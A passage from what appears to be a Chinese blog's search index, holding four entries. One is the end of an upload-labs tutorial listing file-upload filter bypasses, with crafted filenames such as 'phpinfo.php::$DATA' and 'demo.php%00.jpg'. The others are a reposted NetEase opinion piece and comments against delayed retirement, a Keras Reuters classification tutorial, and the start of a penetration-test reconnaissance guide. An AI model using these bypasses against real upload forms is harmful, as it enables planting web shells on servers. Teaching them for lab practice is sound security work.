在window的时候如果文件名+\u0026quot;::$DATA\u0026quot;会把::$DATA之后的数据当成文件流处理,不会检测后缀名，且保持::$DATA之前的文件名，他的目的就是不检查后缀名\n例如:\u0026ldquo;phpinfo.php::$DATA\u0026quot;Windows会自动去掉末尾的::$DATA变成\u0026quot;phpinfo.php\u0026rdquo;\n实例：uploads-labs —— Pass-09\n### 7. 点号绕过 Windows 系统会自动去掉后缀名最后的**“.”，或者服务端不存在 deldot($file_name) 用以删除文件名后面的空格，就那么可以通过在文件名后面加“.”**进行绕过。\n​\t实例：uploads-labs —— Pass-08\n8. 双写绕过 str_ireplace(php,\u0026quot;\u0026quot;,pphphp)\n通常出现这个函数往往只会替换一次，那么就可以通过双写后缀名进行绕过：\npphphp \u0026raquo; php\n实例：uploads-labs —— Pass-10\n9. 00 截断 0x00，%00，/00之类的截断，都是一样的，只是不同表示而已。\n0x开头表示16进制，0在十六进制中是00, 0x00就是%00解码成的16进制，\n%00 截断的使用条件：\nphp版本必须小于5.3.4 且 php.ini中的 magic_quotes_gpc设置为Off\n原理：\nphp的一些函数的底层是C语言，而move_uploaded_file就是其中之一，遇到0x00会截断，0x表示16进制，URL中%00解码成16进制就是0x00。\n在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束 0x开头表示16进制，0在十六进制中是00, 0x00就是%00解码成的16进制 。\n效果：\ndemo.php%00.jpg \u0026raquo; demo.php\n实例：uploads-labs —— Pass-11\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/","title":"文件上传漏洞"},{"content":" \u003c!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"\u003e 我们为什么要对延迟退休说不_网易新闻 网易首页-新闻-体育-娱乐-财经-汽车-科技-数码-手机-女人-房产-游戏-读书-论坛-视频-博客-乐乎 搜索 新闻 网页 新闻 导语:近日，人力资源与社会保障部发布消息称，中国拟逐步将法定退休年龄提高到65岁，每年可减缓养老基金缺口200亿元。固然应当承认退休年龄相应延长的必然趋势，但如果以“延迟退休”作为缓解养老金收支平衡的“猛药”，对症中国当前的虚弱身体，不仅不能药到病除，甚至会带来不可避免的副作用。[详细] \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; 靠老人多工作五年，养老金缺口只是减缓扩大而空帐仍在 \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; 中国养老金从施行当年即收不抵支，正以每年1000多亿元的规模不断扩大 1997年，中国政府制定了《关于建立统一的企业职工基本养老保险制度的决定》，开始在全国建立统一的城镇企业职工基本养老金制度。然而，1998年我国就有半数省市养老金收不抵支。根据劳动与社会保障部公布数据显示，2005年底，中国养老基金空帐已达到8000亿元，且每年以1000多亿元的规模扩大。\n截止到2010年，国家养老金个人账户本应有资产19596亿元人民币，但实际上却只有2039亿元人民币，导致17557亿元人民币的缺口将要由政府来偿还。据世界银行的一项估算，从2001年到2075年，中国养老金缺口可能达到9万亿元人民币，目前对中国养老金缺口的估算，最乐观的也认为缺口将达到三万亿人民币。 [详细]\n\u0026nbsp; 社保资金开源信号频出，在养老金长期存在巨大缺口的情况下，充实社保基金、拓宽资金来源已迫在眉睫。 \u0026nbsp; \u0026nbsp; \u0026nbsp; 养老金收益率仅2%世界最低，养老金无法增值保值延迟退休仍需面对超三万亿空帐 从2000至2008年间，中国CPI平均2.2%，面对同样是2.2%的通胀率，养老钱实际上已经处于贬值状态。而当前，社保五险基金的投资渠道只有存银行和买国债，不足2%的名义收益率恐怕是世界上收益率最低。\n目前中国男女退休年龄的时间分别是60岁、55岁，如果从今年起实施65岁的退休年龄，以每3年提高一岁，则可以使得中国的人口红利延长到2027年。15年的时间，即便排除通货膨胀、人口老龄化等增加养老金支出的因素，保守估计空帐规模也已经达到27200亿元。以不足2%的收益率，又该如何填补这个空帐？ [详细]\n\u0026nbsp; 养老金全民覆盖率不到三成，多干五年让本来没交的更不想参保 \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; 中国养老金覆盖仅25%，而全国统收制度全覆盖30年就能实现制度自身的收支平衡 中国养老金制度面临的很大问题，还在于城乡之间、地区之间、机关事业单位和企业之间、不同群体之间社会保障待遇的差距很大，甚至一部分人没有任何保障。2010年初，美世咨询公司(Mercer)发布全球养老金指数，该指数覆盖五个大陆、十一个国家的私人和公共养老金体系，在对三大类、40多个指标进行分析比对后, 中国的指数排在倒数第二位, 仅优于日本。美世公司认为：“一个较好的养老体系中, 社会养老保险应能覆盖到80% 以上的人口, 而中国目前只有25%左右, 即使在覆盖率较高的北京、上海等城市, 也只有50% 左右。” 下一代人负担上一代人的养老不仅是自古皆然，也是世界各国的通例，我们需要做的只是对因为人口老龄化造成的下一代人负担的加重部分进行化解。如同中国人民大学教授郑功成称：“只要实现全国统筹制度全覆盖，未来30年左右完全能够实现制度自身的收支平衡 ，有能力避免养老金支付危机。” [详细]\n\u0026nbsp; 人力资源和社会保障部近日发布的“2011年度人力资源和社会保障事业发展统计公报”显示，2011年年末全国参加城镇基本养老保险的农民工人数为4140万人，而该年度全国农民工总量为25278万人。 \u0026nbsp; \u0026nbsp; \u0026nbsp; 农民工参保率仅占总数1/6，延迟退休无助于扩大养老保险覆盖面，自然会减少养老保险收入 目前，中国已经有25个省市实现了省级统筹，但这仅仅只是账面意义上的统筹，而非实质性的统筹。2010年，国家就已计划在320个县开展新型农村社会养老保险试点，但由于新农保、城居保与城镇职工基本养老保险的衔接转换通道未彻底打通，农民工的参保率依旧仅占总数的1/6，没有显著的提高。在这种情况下, 如果延迟退休, 势必使得扩大基本养老保险覆盖面的工作受到很大冲击。延迟退休年龄可能使得许多原本未被制度所覆盖的人拒绝参保。养老保险覆盖面低, 自然也减少了养老保险的收入。 [详细]\n\u0026nbsp; 社保政府支出总量少腐败多，延迟退休利益无法均分到个人头上 \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; 国家财政用于社保支出仅占行政经费1/4，养老保险挪用案层出不穷，加重社保基金压力 国家财政是社会保障指出主要的负责人，但在“十二五”之前，财政用于社会保障的支出多年持续低于10%，同期的行政经费却高达1/5。与日本、加拿大这样同期社保支出超过公共财政30%的国家相比，明显过低。因而压缩“三公消费”，增加“社保支出”，理当成为缓解社保资金问题的首要出路。更何况，早期国有企业普遍以“低工资无社保”为代价，国家承诺的政府养老没有兑现，现在一古脑儿要社保基金承担养老支付，必然使得社保基金压力持续增大。 而全国各地社保案层出不穷也使得公共权力不断受到质疑。从1993年开始，广州8.9亿元养老保险金被挪用，无法完全追回；2003年6月，太原市财政局科员挪用社保基金8609万元；2006年，上海市劳动和社会保障局原局长祝均一违规拆借32亿元社保基金……相较而言，全国参保人退休年龄延迟一年，也仅仅只能使养老统筹基金增长的40亿元而已。[详细]\n\u0026nbsp; 2007年，上海市劳动和社会保障局原局长祝均一等人因涉案32亿元被判犯受贿罪、挪用公款罪、滥用职权罪，数罪并罚，处以有期徒刑十八年。 体制内外养老金双轨制不改革，要百姓多干五年为公务员养老？ \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; 处级公务员从不交社保退休金可高达七八千，国家为其买单一年需支付218亿元人民币 目前我国实行的“退休金双轨制”，有两套并行的养老金体系，一套是政府部门、事业单位的退休制度，个人无须缴纳社保，由财政统一支付的养老金；另一套是社会企业单位的“缴费型”统筹制度，单位和职工本人按照整个工龄以总的工资的20%比例来缴纳。\n这种不平等导致了政府替公务员退休金买单日益变得不可持续。政府2010年向退休公务员的财政转移支付为218亿元人民币，达GDP的5.4%。人近几年退休福利巨大的不平等导致了民众普遍的不满，2011年时，广州市人大代表黄瑞麟爆料称：“处级公务员退休金能拿到7000—8000元/月，企业的经理们每月自己缴纳养老金1000多元，但退休时封顶也就是1700元/月。”\n不解决体制内外社保的公平正义问题，社保亏空问题无解。体制内没有缴费的个人账户本身没有积累，却要按照有积累的形式来发放养老金，没有人来买单，本身就是一个缺口。[详细]\n\u0026nbsp; 每年两会，都有政协委员提案建议“取消退休金双轨制”，至今仍毫无进展。人保部官员回应称：“这方面的工作正处于研究阶段，这个事情的涉及面比较广、过程比较复杂。” 下岗职工承担国企改革的代价，终于盼来退休凭什么还要再熬五年 \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; 大部分国企员工想方设法提前退休，企业职工延迟退休则福利大大缩水，两者并存退休年龄亟待规范 由于上世纪末大批国企由于经营不善宣布破产，从1998年至2001年三年间，国企职工从286万下降到233万，下降率达到24.4%，离退休人口却由115万升到119万。大部分国企员工想方设法提前退休，提早享受养老金待遇。1999年至2003年的五年中，提前退休人数达到当期退休人数的20%。而十个主要城市的新增退休人员中，提前退休的已近1/3。部分提前退休的人员是非常健康的，却往往以丧失劳动能力为由办理了病退；还有部分行政管理人员以特殊工种名义提前退休。\n而对于那些已经内退或提前退休等需要自己缴纳养老金的人群而言，延迟退休则是个不折不扣的噩耗。他们需要缴纳更多的费用，所获却相应减少。多数学者在论证我国延迟退休年龄合理性的时候, 都以预期寿命在延长为主要依据之一。但从数据上看, 我国老年人口60岁以上各年龄组老人的平均余寿在1980至2000年间虽然在提高, 但目前仍远低于一般发达国家。而如果将退休年龄推至到65岁，按中国人平均寿命72岁来算，退休后只能拿到7年的养老保障金。假定他25岁参加工作，按40年的参保标准来算，平均参保款3000元/年*40年=120000元，退休后保障工资为6000元/年*7年=42000元，凭空损失78000元。[详细]\n\u0026nbsp; 如今，大批下岗职工在经济来源断绝的同时，还需要交纳每年四五千元并不断上涨的社保金、养家糊口，并有可能遇到家人就医、孩子上学成家、住房改善等特殊情况需要开销。 弹性退休听上去很美，在中国却容易使特权关系户只拿工资不干活\t\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; 民企用人本来就极少年龄限制，延迟退休为特权职工以及其他有背景者提供了“恋官”“恋职”的绝佳理由 基于美国相关制度的实践，2010年9月6日，上海市出台了《关于本市企业各类人才柔性延迟办理申领基本养老金手续的试行意见》，试行“弹性退休”政策，以此对不同行业的劳动者区别对待。使得一些工作劳累、收入又低的体力劳动者，提前退休得到解脱和享受。\n然而对于目前的中国而言，这项政策只会涉及到一个很小的范围。因为民营企业用人，本来就极少年龄限制，只要对企业有用，七老八十也照样可以上班。因此，这项政策很大程度上涉及到的就是国有企业等很少一部分人。在公务员、事业单位、国企及垄断行业的队伍中，目前工作在一线的多以合同制工人为主，但往往也还有一部分“正式职工”退居二线却享受特权。缺乏必要的行业监管与考核制度，延迟退休为这些特权职工以及其他有背景者，提供了继续享受特权5年的便利条件。更为领导者提供了“恋官”“恋职”的绝佳理由。[详细]\n\u0026nbsp; 在权利面前，弹性延迟退休年龄是否是为官员做的“顶层设计”？ 延迟退休造成就业岗位无法腾出，更多啃老族盯着父母的退休金 \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; 目前中国市场依旧需要由已经缴纳社保的人群不断增加缴纳年限、减少领取年限，来填补无底洞似的社保亏空 尽管从2012年开始，中国人口红利逐渐消失，但老龄化并不等于中国劳动力不足。目前中国市场依旧需要由已经缴纳社保的人群不断增加缴纳年限、减少领取年限，来填补无底洞似的社保亏空。根据人力资源和社会保障部公布数据显示，2011年，全国城镇新增就业1221万人，城镇失业人员再就业553万人，就业困难人员实现就业180万人，城镇登记失业率为4.1%。假设我国平均退休年龄延长5年，每年可能会涉及上千万人。一方面巨量岗位无法腾出，另一方面又很难通过新开发岗位等方式来化解。这不仅意味着人力资源的极大浪费，而且也意味着今后养老金积累的困难，其结果是当年轻的劳动力人口进入老年后，其养老问题将会成为更难解决的社会问题。[详细]\n\u0026nbsp; “十二五”期间，中国高校毕业生总量将以３%的速度增长，年均规模达到700万人。而大学生就业难则有着更加复杂的体制原因。 多干五年面临的失业风险加大，高龄就业者面临的隐性门槛多 \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; 中国并无关于年龄歧视的具体法律条文，市场无法在延迟退休之后保障高龄就业者就业权利 与多数已施行弹性延迟退休制度的国家不同，中国目前许多单位招工用人，年龄是一种非常重要的门槛，“4050”群体普遍遭遇就业难现象。对此，中国目前并没有专门的《反就业歧视法》，而现有法律对就业其实的界定也过于狭窄——《劳动法》关于就业歧视的规定主要包括性别、宗教、种族、民族四类，甚至没有关于年龄歧视的条文。 经济的全面市场化，已经从根本上改变了人们的就业状态和观念，许多人都难以终老于一个职业，失业、更换职业的情形越来越多，而延迟退休年龄，则使得高龄就业者的公平就业权利无从保障。[详细]\n\u0026nbsp; 从1998年至2005年7年时间中国国有企业裁掉近六成的员工。 \u0026nbsp; 与“先富后老”的发达国家不同，还没富裕起来的中国已快步进入了老龄化社会。辛苦半辈子的工薪族对虽然微薄但几乎是全部生活来源的养老金需求更为迫切，也对公平问题更加敏感。在与之相关的社保、劳动关系尚未理顺前，贸然延迟退休很可能是压倒希望的最后一根稻草。\n\u0026nbsp; 网易新闻另一面往期回顾 \u0026nbsp; \u0026nbsp; 第900期：古英国审判权贵：不偏不倚，王在法下 第899期：危险的中国水坝：年均溃坝68座 第898期：“张太”争议广告无需“大刑伺候” 第897期：黑龙江洪涝中俄相互指责无益防洪 第896期：汽车年检：车主的麻烦制造者 第895期：不必警惕“郭敬明” 6150人跟贴 | 167427人参与 热门跟贴跟贴用户自律公约\u0026gt;\u0026gt;网易来自火星网友ip:2012-06-08 05:51:49上世纪末突然一句话，让多少万人下岗；现在这批下岗职工好容易熬到了退休的年龄，突然又是一句话，得延迟5年才能拿养老金。那一代人真是倒了八辈子霉。+1顶[18357]-1踩[0]回复分享hbhwj[网易山东济南网友]2012-06-08 06:01:58本质上就是对当官的有利，对其他人好像没有什么好处！！+1顶[12991]-1踩[0]回复分享网易来自火星网友ip:2012-06-08 06:12:06不交退休金的公务狗滚出养老体系，畜生+1顶[12262]-1踩[0]回复分享最新跟贴liujinan1121[网易广东广州网友]2017-08-26 10:59:33网易来自火星网友()1全民拒交养老金+1顶[64]-1踩[0]回复分享风吹云碎[网易山西太原网友]2全民拒交养老金+1顶[180]-1踩[0]回复分享siqungaowa[网易陕西西安网友]3全民拒交养老金+1顶[9]-1踩[0]回复分享养老金不够养老，真够讽刺的+1顶[1]-1踩[0]回复分享我要脱鞋不是妥协[网易吉林吉林市网友]2016-11-10 09:42:13关于延时退休和养老的问题，我有我的态度。 先来分析，在做判断。 1978年出台的制度，男性干部、工人年满60周岁，女干部年满55周岁，女工人年满50周岁，连续工龄或工作年限满10年。（正常工种，特殊工种不计） 那一时期的人均寿命是，世界人均男子56.3女子58.8，发达国家男子68.4女子75.7，发展中国家男子54.2女子56.6.数据的水份暂时忽略不计！ 根据实际情况分析，现实生活条件综合之后，广普大众人群的寿命大多数男子和多数女子死在缴费中、、、、、少数的干部（男女）未缴费却成为真正的既得利益者。 由此可见：事实证明这个制度很有问题。 不仅有问题，问题还很多很严重。例如：现在人均寿命提高了。广普大众也有一部分人熬到了退休年龄，开始参与分配利益了。结果是基金原始积累的部分早早就已经被吞噬了，只能从年轻人现缴费中领取。干部们不仅领取高额，而且都很健康且更长寿（所以所占比列更庞大），导致入不敷出。 维持不下去了，很危险啊！研发新政，（延时退休）让广普大众的生命结束在缴费中、、、、、、。 既能增加缴费（满足干部开支），又能屏蔽那些参与分配利益的广普大众！ 作为广普大众，我的收入有限，上有老下有小，不能供养宠儿！敬请谅解、、、、、+1顶[5]-1踩[0]回复分享我要脱鞋不是妥协[网易吉林吉林市网友]2016-11-10 09:40:17关于延时退休和养老的问题，我有我的态度。 先来分析，在做判断。 1978年出台的制度，男性干部、工人年满60周岁，女干部年满55周岁，女工人年满50周岁，连续工龄或工作年限满10年。（正常工种，特殊工种不计） 那一时期的人均寿命是，世界人均男子56.3女子58.8，发达国家男子68.4女子75.7，发展中国家男子54.2女子56.6.数据的水份暂时忽略不计！ 根据实际情况分析，现实生活条件综合之后，广普大众人群的寿命大多数男子和多数女子死在缴费中、、、、、少数的干部（男女）未缴费却成为真正的既得利益者。 由此可见：事实证明这个制度很有问题。 不仅有问题，问题还很多很严重。例如：现在人均寿命提高了。广普大众也有一部分人熬到了退休年龄，开始参与分配利益了。结果是基金原始积累的部分早早就已经被吞噬了，只能从年轻人现缴费中领取。干部们不仅领取高额，而且都很健康且更长寿（所以所占比列更庞大），导致入不敷出。 维持不下去了，很危险啊！研发新政，（延时退休）让广普大众的生命结束在缴费中、、、、、、。 既能增加缴费（满足干部开支），又能屏蔽那些参与分配利益的广普大众！ 作为广普大众，我的收入有限，上有老下有小，不能供养宠儿！敬请谅解、、、、、+1顶[1]-1踩[0]回复分享我要脱鞋不是妥协[网易吉林吉林市网友]2016-11-10 09:34:16关于延时退休和养老的问题，我有我的态度。\n先来分析，在做判断。\n1978年出台的制度，男性干部、工人年满60周岁，女干部年满55周岁，女工人年满50周岁，连续工龄或工作年限满10年。（正常工种，特殊工种不计）\n那一时期的人均寿命是，世界人均男子56.3女子58.8，发达国家男子68.4女子75.7，发展中国家男子54.2女子56.6.数据的水份暂时忽略不计！\n根据实际情况分析，现实生活条件综合之后，广普大众人群的寿命大多数男子和多数女子死在缴费中、、、、、少数的干部（男女）未缴费却成为真正的既得利益者。\n由此可见：事实证明这个制度很有问题。\n不仅有问题，问题还很多很严重。例如：现在人均寿命提高了。广普大众也有一部分人熬到了退休年龄，开始参与分配利益了。结果是基金原始积累的部分早早就已经被吞噬了，只能从年轻人现缴费中领取。干部们不仅领取高额，而且都很健康且更长寿（所以所占比列更庞大），导致入不敷出。\n维持不下去了，很危险啊！研发新政，（延时退休）让广普大众的生命结束在缴费中、、、、、、。\n既能增加缴费（满足干部开支），又能屏蔽那些参与分配利益的广普大众！\n作为广普大众，我的收入有限，上有老下有小，不能供养宠儿！敬请谅解、、、、、+1顶[1]-1踩[0]回复分享162726426[网易北京网友]2016-08-05 14:36:28延迟退休对大龄下岗、失业、灵活就业、一线工人等弱势群体来说就是雪上加霜、火上浇油。延迟退休应尊重本人意愿，在制定政策上多听取广大群众意见，不能只听专家、教授和官员忽悠，充分考虑各阶层利益，退休可以有个区间选择，如55-65岁，也可以工龄社保缴纳满35年申请退休，这样对工作早的人来说更公平、合理、人性，不能只考虑年龄。+1顶[7]-1踩[0]回复分享菜鸟老顽童[网易上海网友]2016-08-04 11:46:34网易来自火星网友()1全民拒交养老金+1顶[64]-1踩[0]回复分享风吹云碎[网易山西太原网友]2全民拒交养老金+1顶[180]-1踩[0]回复分享siqungaowa[网易陕西西安网友]3全民拒交养老金+1顶[9]-1踩[0]回复分享隔墙有耳八[网易浙江杭州网友]4你进企业就得交，不交就没的做+1顶[2]-1踩[0]回复分享想拒交，要么是私企，要么是没正当职业。+1顶[3]-1踩[0]回复分享菜鸟老顽童[网易上海网友]2016-08-04 11:45:35中国到底缺不缺劳动人口？缺，也不缺。这话太对了，特别想退休的人的职业，太缺。不想退休的人的职业，不缺。+1顶[5]-1踩[0]回复分享菜鸟老顽童[网易上海网友]2016-08-04 11:45:21中国到底缺不缺劳动人口？缺，也不缺。这话太对了，特别想退休的人的职业，太缺。不想退休的人的职业，不缺。+1顶[0]-1踩[0]回复分享有态度网友066yHK[网易山东济南网友]2016-07-28 19:20:08 强烈反对延迟退休政策！！！我i们容易吗！！！+1顶[6]-1踩[0]回复分享网易来自火星网友ip:2016-07-25 15:52:21博士毕业的飘过，都30好几了，高学历的人员伤不起啊~~~~~~~~~~~+1顶[2]-1踩[0]回复分享查看全部跟贴\u0026gt;\u0026gt;网友跟贴6150人跟贴 |167427人参与 |手机发跟贴 |注册文明上网，登录发贴自动登录登录并发表网友评论仅供其表达个人看法，并不表明网易立场。\n编辑：沈燕妮 关注网易另一面：网易微博　新浪微博　| 新闻首页 | 回到顶部\u0026nbsp;\u0026nbsp; 北京互联网违法不良信息举报　意见反馈　新闻地图　About NetEase - 公司简介 - 联系方法 - 招聘信息 - 客户服务 - 隐私政策 - 网络营销 - 网站地图\n网易公司版权所有\n©1997-2022 × ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/%E6%88%91%E4%BB%AC%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E5%AF%B9%E5%BB%B6%E8%BF%9F%E9%80%80%E4%BC%91%E8%AF%B4%E4%B8%8D/","title":"我们为什么要对延迟退休说不"},{"content":"新闻分类：多分类问题 简介 本例出自《Python 深度学习》，自己做了一个简单的总结归纳。\n完整代码请参考：[https://github.com/fchollet/deep-learning-with-python-notebooks](\n数据预处理 graph LR A[原始新闻内容] --\u0026gt; |关键词分割|C[建立关键词索引] C --\u0026gt; |将关键词转索引|D[原始评论转向量] D --\u0026gt; 列表编码为二进制矩阵 graph LR 原始评论标签 --\u0026gt; one-hot编码将标签向量化 训练模型 graph LR A1(第一层:16个输出单元) --\u0026gt; A[构建模型] A2(第二层:16个输出单元) --\u0026gt; A A3(第三层:1个输出单元) --\u0026gt; A A ==\u0026gt; B[编译模型] B1(配置优化器和损失函数) --\u0026gt; B B ==\u0026gt; C[加入验证集训练模型] C ==\u0026gt; D[绘制图表观察模型最佳参数] D1[欠拟合与过拟合之间] --\u0026gt; D D ==\u0026gt; E[选择最佳参数训练模型] E ==\u0026gt; F[在新数据上使用模型] 代码 加载数据集 注意：第一次运行会下载数据集，速度较慢。\n1 2 3 from keras.datasets import reuters (train_data, train_label), (test_data, test_label) = reuters.load_data(num_words=10000) 将向量还原为原始新闻（非必须） 执行这一步只是为了更直观的了解别人是怎么处理数据的。\n这里同样会下载数据。\n1 2 3 4 word_index = reuters.get_word_index() reverse_word_index = dict([(value, key) for (key, value) in word_index.items()]) decoded_newswire = \u0026#39; \u0026#39;.join([reverse_word_index.get(i-3, \u0026#39;?\u0026#39;) for i in train_data[0]]) print(decoded_newswire) 将数据向量化 1 2 3 4 5 6 7 8 9 10 11 import numpy as np # 数据向量化 def vectorize_sequences(sequences, dimension=10000): results = np.zeros((len(sequences), dimension)) for i, sequence in enumerate(sequences): results[i, sequence] = 1. return results x_train = vectorize_sequences(train_data) x_test = vectorize_sequences(test_data) 使用 one-hot 编码将标签向量化 1 2 3 4 5 6 7 8 9 10 11 12 # one-hot编码方法实现 # def to_one_hot(labels, dimension=10000): # results = np.zeros((len(labels), dimension)) # for i, label in enumerate(labels): # results[i, label] = 1. # return results # 使用keras内置方法将标签向量化 from keras.utils.np_utils import to_categorical one_hot_train_labels = to_categorical(train_label) one_hot_test_labels = to_categorical(test_label) 构建模型 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 # 定义模型 from keras import models from keras import layers model = models.Sequential() \u0026#34;\u0026#34;\u0026#34; Q: 为什么此处输入单元数要使用64，为什么不使用电影评论分类时使用的16？ A：16维空间对于这个例子来说太小了，无法学会区分46个不同的类别。 这种维度较小的层可能成为信息瓶颈，永久地丢失相关信息。 如果是三分类，四分类问题你依然可以使用16个隐藏单元 Q：我能不能设置为640个单元？ A：单元数不是越大越好，网络容量越大，网络就越容易记住训练过的数据。 网络会在训练过的数据上表现优异，但是在没有见过的数据上的表现则不容乐观。 因此单元数不是越大越好，需要在欠拟合与过拟合之间找到一个平衡点。 \u0026#34;\u0026#34;\u0026#34; model.add(layers.Dense(64, activation=\u0026#39;relu\u0026#39;, input_shape=(10000, ))) model.add(layers.Dense(64, activation=\u0026#39;relu\u0026#39;)) model.add(layers.Dense(46, activation=\u0026#39;softmax\u0026#39;)) # 编译模型 model.compile(optimizer=\u0026#39;rmsprop\u0026#39;, loss=\u0026#39;categorical_crossentropy\u0026#39;, metrics=[\u0026#39;accuracy\u0026#39;]) 验证模型 1 2 3 4 5 6 7 8 9 # 留出验证集 x_val = x_train[:1000] partial_x_train = x_train[1000:] y_val=one_hot_train_labels[:1000] partial_y_train = one_hot_train_labels[1000:] # 训练模型 history = model.fit(partial_x_train, partial_y_train, epochs=20, batch_size=512, validation_data=(x_val, y_val)) 绘制训练情况图表 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 # 绘制训练损失和验证损失 import matplotlib.pyplot as plt loss = history.history[\u0026#39;loss\u0026#39;] val_loss = history.history[\u0026#39;val_loss\u0026#39;] epochs = range(1, len(loss)+1) plt.plot(epochs, loss, \u0026#39;bo\u0026#39;, label=\u0026#39;Training loss\u0026#39;) plt.plot(epochs, val_loss, \u0026#39;b\u0026#39;, label=\u0026#39;Validation loss\u0026#39;) plt.title(\u0026#39;Training and validation loss\u0026#39;) plt.xlabel(\u0026#39;Epochs\u0026#39;) plt.ylabel(\u0026#39;Loss\u0026#39;) plt.legend() # 绘制训练精度和验证精度 plt.clf() acc = history.history[\u0026#39;accuracy\u0026#39;] val_acc = history.history[\u0026#39;val_accuracy\u0026#39;] plt.plot(epochs, acc, \u0026#39;bo\u0026#39;, label=\u0026#39;Training acc\u0026#39;) plt.plot(epochs, val_acc, \u0026#39;b\u0026#39;, label=\u0026#39;Validation acc\u0026#39;) plt.title(\u0026#39;Training and validation accuracy\u0026#39;) plt.xlabel(\u0026#39;Epochs\u0026#39;) plt.ylabel(\u0026#39;Accuracy\u0026#39;) plt.legend() plt.show() 重新训练模型 观察图表，发现模型在第十轮附近出现过拟合现象。那么我们重新训练模型就训练九轮就行（可以尝试其它的）。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 # 重新训练模型 model = models.Sequential() model.add(layers.Dense(64, activation=\u0026#39;relu\u0026#39;, input_shape=(10000, ))) model.add(layers.Dense(64, activation=\u0026#39;relu\u0026#39;)) model.add(layers.Dense(46, activation=\u0026#39;softmax\u0026#39;)) model.compile(optimizer=\u0026#39;rmsprop\u0026#39;, loss=\u0026#39;categorical_crossentropy\u0026#39;, metrics=[\u0026#39;accuracy\u0026#39;]) history = model.fit(partial_x_train, partial_y_train, epochs=9, batch_size=512, validation_data=(x_val, y_val)) # 观察在测试集上表现 results = model.evaluate(x_test, one_hot_test_labels) print(results) # [0.9868815943054715, 0.7862867116928101] # 80%左右的精度 # 采取随机预测的方式 import copy test_labels_copy = copy.copy(test_label) np.random.shuffle(test_labels_copy) hits_array = np.array(test_label) == np.array(test_labels_copy) print(float(np.sum(hits_array)) / len(test_label)) # 0.18788958147818344 # 20%的精度，可以看出模型的预测效果好得多 绘制图表观察重新训练的模型各项指标 - 小结 如果要对N个类别的数据点进行分类，网络的最后一层应该是大小为N的Dense层。 对于单标签、多分类问题，网络的最后一层应该使用 softmax 激活，这样可以输出在N个输出类别上的概率分布。 这种问题的损失函数几乎总是应该使用分类交叉熵。它将网络输出的概率分布与目标的真实分布之间的距离最小化。 如果你需要将数据划分到许多类别中，应该避免使用太小的中间层，以免在网络中造成信息瓶颈。 处理多分类问题的标签有两种方法。 通过分类编码（也叫one-hot编码）对标签进行编码，然后使用categorical_crossentropy 作为损失函数。 将标签编码为整数，然后使用 sparse_categorical_crossentropy 损失函数。 ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/%E6%96%B0%E9%97%BB%E5%88%86%E7%B1%BB%E5%A4%9A%E5%88%86%E7%B1%BB%E9%97%AE%E9%A2%98/","title":"新闻分类：多分类问题"},{"content":"信息手机——域名信息获取 一、域名介绍 1. 域名定义 域名（Domain Name），又称网域，是由一串用点分隔的名字组成的Internet上某一台计算机或计算机组的名称，用于在数据传输时对计算机的定位标识。\n2. 域名与IP 当我们访问一个网址时，我们既可以通过它的域名进行访问，也可以通过直接输入它的服务器的IP地址进行访问，那么为什么我们大多数都是用的域名而不是用IP地址呢？ 这是因为IP地址不方便记忆，且不能显示地址组织的名称和性质。因此人们设计出了域名，并通过网域名称系统（DNS，Domain Name System）来将域名和IP地址相互映射，使人更方便地访问互联网，而不用去记住能够被机器直接读取的IP地址数串。 举个例子： 当我们访问www.baidu.com这个域名时，我们的电脑会向DNS查询百度的IP地址。然后我们再通过百度的IP地址进行访问百度。因此我们在输入网址时，实质上也是通过IP地址访问的服务器，只是从域名到IP地址的转换阶段对我们屏蔽了。\n二、收集域名信息 当我们需要对一个网站进行渗透测试时，我们需要用到大量的信息。因此收集这些网站的信息是一件极其重要的事。\n1. 利用whois查询 whois是一个用来查询域名是否已经被注册，以及注册域名的详细信息的数据库（如域名所有人、域名注册商）。不同域名后缀的whois信息需要到不同的whois数据库查询。 例如如.com的whois数据库和.edu的whois数据库就不相同。 查询接口：\nhttps://whois.aliyun.com https://www.whois365.com/cn http://whois.chinaz.com https://whois.aizhan.com 在Kali中，可以在终端输入whois 目标网址进行查询 2. ICP备案查询 ICP（Internet Content Provider）即为网络内容服务商，即向广大用户综合提供互联网信息业务和增值业务的电信运营商。其必须具备的证书即为ICP证。ICP证是指各地通信管理部门核发的《中华人民共和国电信与信息服务业务经营许可证》。 根据《互联网信息服务管理办法》指出互联网信息服务分为经营性和非经营性两类。国家对经营 性互联网信息服务实行许可制度；对非经营性互联网信息服务实行备案制度。未取得许可或 者未履行备案手续的，不得从事互联网信息服务。 对于国内网站，我们可以通过查询ICP来得到相应的信息。 查询接口：\n工业和信息化部ICP/IP地址/域名信息备案管理系统 站长之家 http://icp.alexa.cn/ http://www.beianbeian.com/ 三、收集子域名 对于一个网站的管理员来说，他在自己的顶级域名设下的防护相对于其子域名来说要强的多。 因此我们在对网站进行渗透测试时，往往是从其子域名入手。因此收集其子域名也是信息收集的一项重要工作。\n子域名挖掘工具： Maltego CE（该工具需要登注册登陆才能使用，有条件的可以使用） 搜索引擎挖掘： 